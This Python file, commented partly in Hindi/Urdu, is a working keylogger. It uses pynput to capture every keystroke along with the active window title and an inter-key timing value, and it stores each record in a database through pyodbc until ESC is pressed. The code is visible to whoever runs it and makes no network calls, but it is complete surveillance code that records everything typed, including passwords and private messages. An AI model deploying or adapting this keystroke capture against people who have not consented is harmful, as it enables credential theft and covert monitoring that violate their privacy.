import time
import datetime
import pygetwindow as gw
from pynput import keyboard
import pyodbc
from database import get_connection

# Global variable for speed calculation
last_press_time = None 
USER = "Administrator" # User ka naam jo aap save karna chahte hain

def insert_keystroke(user_name, key_pressed, window_title):
    # ... (body of insert_keystroke is the same)
    conn = None
    try:
        global last_press_time
        current_time = time.time()
        
        if last_press_time is not None:
            time_diff = current_time - last_press_time
            typing_speed = round(time_diff * 1000, 2) if time_diff < 1.0 else 0.0 
        else:
            typing_speed = 0.0 
            
        last_press_time = current_time

        risk_level = "Low" 
        current_datetime = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        conn = get_connection()
        cursor = conn.cursor()

        insert_query = """
        INSERT INTO Keystrokes (user_name, key_pressed, typing_speed, window_title, risk_level, timestamp)
        VALUES (?, ?, ?, ?, ?, ?)
        """
        
        cursor.execute(insert_query, 
                       (user_name, 
                        key_pressed, 
                        typing_speed, 
                        window_title, 
                        risk_level, 
                        current_datetime))
        
        conn.commit()

    except pyodbc.Error as ex:
        # Agar yahan error ho to woh print ho jayega
        print(f"Database Error: {ex}") 
    except Exception as e:
        # Agar yahan error ho to woh print ho jayega
        print(f"An unexpected error occurred: {e}")
    finally:
        if conn:
            conn.close()

def on_press(key):
    try:
        key_str = str(key.char)
    except AttributeError:
        key_str = str(key).split('.')[-1]

    try:
        active_window = gw.getActiveWindow().title
    except:
        active_window = "Unknown Window"
    
    insert_keystroke(USER, key_str, active_window)

def on_release(key):
    if key == keyboard.Key.esc:
        print("\nKeylogger stopped.")
        return False

# --- Ye Execution Block Zaroori Hai ---
if __name__ == "__main__":
    print("Keylogger started. Press ESC to stop.")
    print("-" * 30)
    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        print(f"Listener setup failed: {e}")